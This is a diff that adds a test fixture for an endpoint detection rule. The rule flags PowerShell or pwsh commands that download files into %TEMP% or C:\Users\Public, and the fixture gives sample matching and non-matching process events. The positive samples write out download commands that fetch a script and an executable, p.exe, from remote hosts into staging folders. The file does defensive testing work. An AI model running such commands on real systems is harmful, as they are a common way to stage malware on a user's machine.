@@ -1,0 +1,32 @@
+id: 28a2bef3-af7f-4b3a-8e7f-08616e25b694
+positive:
+- name: Invoke-WebRequest -OutFile into %TEMP% from raw.githubusercontent.com
+  event: &ev
+    event.code: "1"
+    process.name: powershell.exe
+    process.executable: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    process.command_line: powershell.exe -c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/x/y/main/a.ps1 -OutFile $env:TEMP\a.ps1"
+    process.parent.name: cmd.exe
+- name: PowerShell 7 (pwsh.exe) is covered too
+  event:
+    <<: *ev
+    process.name: pwsh.exe
+    process.executable: C:\Program Files\PowerShell\7\pwsh.exe
+- name: iwr alias into C:\Users\Public
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "iwr http://203.0.113.5/p.exe -OutFile C:\Users\Public\p.exe"
+negative:
+- name: download to a non-temp location
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "Invoke-WebRequest -Uri https://example.com/a.zip -OutFile D:\Software\a.zip"
+- name: Invoke-WebRequest without -OutFile
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "Invoke-WebRequest -Uri https://example.com/ | Out-Null; $env:TEMP"
+- name: DNS event (the old impossible branch) must not match the process rule
+  event:
+    event.code: "22"
+    process.name: powershell.exe
+    dns.question.name: raw.githubusercontent.com
